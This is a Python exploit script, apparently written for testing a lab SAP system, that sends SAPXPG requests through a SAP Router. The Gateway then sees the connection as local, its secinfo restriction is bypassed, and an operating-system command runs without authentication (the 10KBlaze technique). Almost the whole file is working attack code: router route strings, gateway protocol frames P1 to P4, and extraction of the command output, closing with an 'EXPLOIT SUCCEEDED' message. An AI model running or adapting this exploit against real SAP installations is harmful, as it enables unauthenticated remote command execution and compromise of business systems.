#!/usr/bin/env python3
"""
test_sapxpg_via_router.py — SAPXPG via SAP Router.

The SAP Router (port 3299) relays TCP connections. When we route our
SAPXPG connection through the local saprouter, the SAP Gateway sees
the connection arriving from 192.168.2.209 (the saprouter's IP = "local").

secinfo rule: P USER=* USER-HOST=local HOST=local TP=*
             ^ This matches because USER-HOST is now 192.168.2.209 = local!

Attack chain:
  Attacker (192.168.2.210) → saprouter:3299 → GW:3300
  GW sees: connecting IP = 192.168.2.209 (saprouter) = LOCAL → SAPXPG allowed!
"""
import sys, socket, struct, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send, ni_recv, ni_drain, hexdump, extract_p4_output,
)

ROUTER_HOST = '192.168.2.209'
ROUTER_PORT = 3299            # SAP Router port
GW_HOST     = '192.168.2.209'
GW_PORT     = 3300
INSTANCE    = '00'
SID         = 'S4H'
HOSTNAME    = 's4hanadev'
KERNEL      = '793_REL'
DEST        = 'T_75'
CLIENT      = '000'
COMMAND     = 'id'
PARAMS      = ''
TIMEOUT     = 15


def saprouter_connect(router_host, router_port, dest_host, dest_service):
    """Connect via SAP Router.

    SAP Router protocol:
    1. Connect to router on port 3299
    2. Send NI frame with route string: /H/dest_host/S/dest_service
    3. Wait for NI_OK response (6-byte "NI_ROUT\x00" or similar)
    4. Connection is now forwarded to dest_host:dest_service

    The route string format: /H/<host>/S/<service>
    """
    print(f"[ROUTER] Connecting to saprouter at {router_host}:{router_port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((router_host, router_port))
    print(f"[ROUTER] Connected to saprouter")

    # SAP Router route string (NI-framed)
    # Format: /H/<host>/S/<service>\x00
    # or:     /H/<host>/W/<port>\x00
    route_str = f"/H/{dest_host}/S/{dest_service}\x00"
    route_bytes = route_str.encode("ascii")

    # The SAP Router expects an NI frame with the route
    # NI frame: 4-byte big-endian length + payload
    ni_send(sock, route_bytes)
    print(f"[ROUTER] Sent route: {route_str!r}")

    # Wait for response
    try:
        resp = ni_recv(sock, TIMEOUT)
        print(f"[ROUTER] Response ({len(resp)} bytes): {resp[:40].hex()}")
        try:
            print(f"[ROUTER] ASCII: {resp[:40].decode('latin-1', errors='replace')!r}")
        except:
            pass

        # Check for NI_OK / NI error
        # SAP Router returns "NI_ROUT\x00" for OK or error codes
        resp_str = resp.decode('latin-1', errors='replace')
        if 'NI' in resp_str[:20] or len(resp) < 10:
            # Check if it's a success or error indicator
            if b'\x00' in resp[:20] and len(resp) < 20:
                print(f"[ROUTER] Routing may have succeeded (short response)")
            elif any(err in resp_str for err in ['NIERR', 'ROUT', 'refused', 'err']):
                print(f"[ROUTER] Routing FAILED: {resp_str[:60]!r}")
                sock.close()
                return None
            else:
                print(f"[ROUTER] Routing response: {resp_str[:40]!r}")
    except socket.timeout:
        # No response = connection is now forwarded transparently
        print(f"[ROUTER] No response (transparent forwarding?) — proceeding")
    except ConnectionError as e:
        print(f"[ROUTER] Connection closed: {e}")
        sock.close()
        return None

    print(f"[ROUTER] Connected through router to {dest_host}:{dest_service}")
    return sock


def run_sapxpg_via_router():
    """Run SAPXPG through the SAP Router."""
    print(f"\n{'='*60}")
    print("SAPXPG via SAP Router (192.168.2.209:3299 → GW:3300)")
    print(f"Command: {COMMAND!r}")
    print('='*60)

    sock = saprouter_connect(ROUTER_HOST, ROUTER_PORT, GW_HOST, 'sapgw00')
    if not sock:
        print("[!] Failed to connect via SAP Router")
        # Try alternate route format
        print("[*] Trying alternate route format /H/host/W/port...")
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.settimeout(TIMEOUT)
        try:
            sock2.connect((ROUTER_HOST, ROUTER_PORT))
            route_str = f"/H/{GW_HOST}/W/3300\x00"
            ni_send(sock2, route_str.encode("ascii"))
            print(f"[ROUTER] Sent alternate route: {route_str!r}")
            try:
                resp2 = ni_recv(sock2, 5)
                print(f"[ROUTER] Response: {resp2[:40].hex()} = {resp2[:40].decode('latin-1', errors='replace')!r}")
            except socket.timeout:
                print("[ROUTER] No response — proceeding with alternate route")
            sock = sock2
        except Exception as e:
            print(f"[!] Alternate route failed: {e}")
            return False

    # Now use sock as if connected directly to GW
    # The GW will see connecting IP as 192.168.2.209 (router's IP = LOCAL)
    local_ip = ROUTER_HOST  # GW sees this as the "source" IP

    # P1
    print(f"\n[XPG] Sending P1 (GW_NORMAL_CLIENT)...")
    try:
        ni_send(sock, build_p1(GW_HOST, INSTANCE))
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            if parse_response(f)['error']:
                print(f"[XPG] P1 rejected"); sock.close(); return False
        print(f"[XPG] P1 OK ({len(frames)} frames)")
    except socket.timeout:
        print("[XPG] P1 timeout"); sock.close(); return False
    except Exception as e:
        print(f"[XPG] P1 error: {e}"); sock.close(); return False

    # P2
    print(f"[XPG] Sending P2 (F_SAP_INIT SAPXPG)...")
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    ni_send(sock, p2)
    conv_id = None; gw_id = 0
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        raw = frames[0]
        if len(raw) >= 40:
            appc_rc = struct.unpack("!I", raw[32:36])[0]
            sap_rc  = struct.unpack("!I", raw[36:40])[0]
            print(f"[XPG] P2 header: appc_rc={appc_rc} sap_rc={sap_rc}")
            if appc_rc != 0:
                print(f"[XPG] P2 DENIED (appc_rc={appc_rc}) — secinfo still blocking via router")
                sock.close(); return False
        for f in frames:
            info = parse_response(f)
            if info['error']:
                print(f"[XPG] P2 error: {info.get('error_msg', '')}"); sock.close(); return False
            if info['conv_id'] and not conv_id:
                conv_id = info['conv_id']
            if info.get('gw_id') is not None:
                gw_id = info['gw_id']
        print(f"[XPG] P2 OK: conv_id={conv_id!r} gw_id={gw_id}")
    except socket.timeout:
        print("[XPG] P2 timeout"); sock.close(); return False

    if not conv_id: conv_id = '0'
    time.sleep(0.3)

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, COMMAND, PARAMS, gw_id=gw_id)
    ni_send(sock, p3)
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("[XPG] P3 timeout"); sock.close(); return False

    p3_output = []
    for f in frames:
        info = parse_response(f)
        if info['error']:
            print(f"[XPG] P3 error: {info.get('error_msg', '')}"); sock.close(); return False
        p3_output.extend(extract_p4_output(f))

    if p3_output:
        print(f"[XPG] *** COMMAND OUTPUT (P3) ***")
        for ln in p3_output: print(f"    {ln}")
        sock.close(); return True

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    ni_send(sock, p4)
    try:
        resp = ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info['error']:
            print(f"[XPG] P4 error: {info.get('error_msg', '')}"); sock.close(); return False
        output = extract_p4_output(resp)
        if output:
            print(f"[XPG] *** COMMAND OUTPUT (P4) ***")
            for ln in output: print(f"    {ln}")
            sock.close(); return True
        print("[XPG] P4 OK but no output")
    except socket.timeout:
        print("[XPG] P4 timeout")

    sock.close()
    return False


def test_router_connectivity():
    """Quick test: can we connect to the SAP Router at all?"""
    print(f"\n{'='*40}")
    print(f"[TEST] SAP Router connectivity ({ROUTER_HOST}:{ROUTER_PORT})")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ROUTER_HOST, ROUTER_PORT))
        print(f"[TEST] Connected to SAP Router!")

        # Send NI PING (4 zero bytes = length 0)
        sock.sendall(b"\x00\x00\x00\x00")  # NI PING
        try:
            resp = sock.recv(16)
            print(f"[TEST] PING response: {resp.hex()!r}")
        except socket.timeout:
            print(f"[TEST] No PING response (normal for saprouter)")

        sock.close()
        return True
    except ConnectionRefusedError:
        print(f"[TEST] Connection refused — saprouter not listening on {ROUTER_PORT}")
        return False
    except Exception as e:
        print(f"[TEST] Error: {e}")
        return False


if __name__ == '__main__':
    print("=== SAPXPG via SAP Router (10KBlaze local-bypass) ===\n")
    print(f"Route: {ROUTER_HOST}:3299 → GW:{GW_PORT}")
    print(f"Expected: GW sees source IP as {ROUTER_HOST} = 'local' → secinfo passes\n")

    # Test 1: Can we reach the saprouter?
    ok = test_router_connectivity()
    if not ok:
        print("[-] SAP Router not reachable — trying GW directly as fallback")

    # Test 2: SAPXPG via router
    success = run_sapxpg_via_router()

    if success:
        print(f"\n[+] *** EXPLOIT SUCCEEDED via SAP Router! ***")
        print(f"[+] SAPXPG executed as unauthenticated user via router bypass")
    else:
        print(f"\n[-] SAPXPG via router failed")
        print(f"    Check: is saprouter configured to allow /H/192.168.2.209/S/sapgw00 ?")
        print(f"    Check: saprouttab file for route permissions")
